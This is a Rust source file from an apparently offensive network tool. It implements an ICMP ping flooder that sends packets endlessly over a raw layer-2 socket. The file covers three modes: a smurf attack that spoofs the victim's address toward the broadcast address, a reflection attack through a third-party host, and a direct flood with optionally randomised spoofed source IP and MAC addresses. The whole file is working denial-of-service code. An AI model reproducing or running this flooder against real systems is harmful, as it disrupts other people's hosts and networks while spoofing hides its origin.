use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::net::Ipv4Addr;
use crate::arg_parser::PingArgs;
use crate::generators::RandValues;
use crate::iface::IfaceInfo;
use crate::pkt_builder::PacketBuilder;
use crate::sockets::Layer2RawSocket;
use crate::utils::{ inline_display, get_first_and_last_ip, CtrlCHandler, abort, parse_mac };



pub struct PingFlooder {
    args:       PingArgs,
    rand:       RandValues,
    builder:    PacketBuilder,
    iface:      String,
    pkts_sent:  usize,
    pkt_data:   PacketData,
}


#[derive(Default)]
struct PacketData {
    src_ip:  Option<Ipv4Addr>,
    src_mac: Option<[u8; 6]>,
    dst_ip:  Option<Ipv4Addr>,
    dst_mac: Option<[u8; 6]>,
}



impl PingFlooder {

    pub fn new(args: PingArgs) -> Self {
        let iface = IfaceInfo::iface_name_from_ip(args.target_ip);
        let (first_ip, last_ip) = get_first_and_last_ip(&iface);

        Self {
            rand:      RandValues::new(Some(first_ip), Some(last_ip)),
            builder:   PacketBuilder::new(),
            pkts_sent: 0,
            pkt_data:  Default::default(),
            iface,
            args,
        }
    }

    
    
    pub fn execute(&mut self){
        self.set_pkt_info_for();
        self.send_endlessly();
    }



    fn set_pkt_info_for(&mut self) {
        if self.args.smurf {
            self.smurf_attack();
        } else if self.args.reflector_ip.is_some() {
            self.reflection_attack();
        } else {
            self.direct_attack();
        }
    }



    fn smurf_attack(&mut self) {
        self.pkt_data.src_ip  = Some(self.args.target_ip);
        self.pkt_data.src_mac = self.resolve_mac(Some(self.args.target_mac.clone()));
        self.pkt_data.dst_ip  = Some(IfaceInfo::get_broadcast_ip(&self.iface));
        self.pkt_data.dst_mac = Some([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]);
    }



    fn reflection_attack(&mut self) {
        self.pkt_data.src_ip  = Some(self.args.target_ip);
        self.pkt_data.src_mac = self.resolve_mac(Some(self.args.target_mac.clone()));
        self.pkt_data.dst_ip  = self.args.reflector_ip;
        self.pkt_data.dst_mac = if self.args.reflector_mac.is_none() {
                None 
            } else {
                self.resolve_mac(self.args.reflector_mac.clone())
            };
    }



    fn direct_attack(&mut self) {
        self.pkt_data.src_ip  = self.args.src_ip;
        self.pkt_data.src_mac = if self.args.src_mac.is_none() {
                None
            } else {
                self.resolve_mac(self.args.src_mac.clone())
            };

        self.pkt_data.dst_ip  = Some(self.args.target_ip);
        self.pkt_data.dst_mac = self.resolve_mac(Some(self.args.target_mac.clone()));
    }



    fn resolve_mac(&self, input_mac: Option<String>) -> Option<[u8; 6]> {
        if input_mac.is_none() {
            return None;
        }

        let mac = input_mac.unwrap();

        let mac_to_parse = if mac == "local" {
            IfaceInfo::get_mac(&self.iface)
        } else {
            mac
        };

        match parse_mac(&mac_to_parse) {
            Err(e)  => { abort(e) },
            Ok(mac) => { Some(mac) },    
        }
    }

    

    fn send_endlessly(&mut self) {
        let l2_socket = Layer2RawSocket::new(&self.iface);
        let running   = Arc::new(AtomicBool::new(true));
        CtrlCHandler::setup(running.clone());

        while running.load(Ordering::SeqCst) {
            let pkt = self.get_packet();
            l2_socket.send(pkt);
            
            self.pkts_sent += 1;
            inline_display(&format!("Packets sent: {}", &self.pkts_sent));
        }
        
        println!("\nFlood interrupted");
    }



    #[inline]
    fn get_packet(&mut self) -> &[u8] {
        self.builder.icmp_ping_ether(
            self.pkt_data.src_mac.unwrap_or_else(|| self.rand.get_random_mac()),
            self.pkt_data.src_ip.unwrap_or_else( || self.rand.get_random_ip()),
            self.pkt_data.dst_mac.unwrap_or_else(|| self.rand.get_random_mac()),
            self.pkt_data.dst_ip.unwrap_or_else( || self.rand.get_random_ip())
        )
    }

}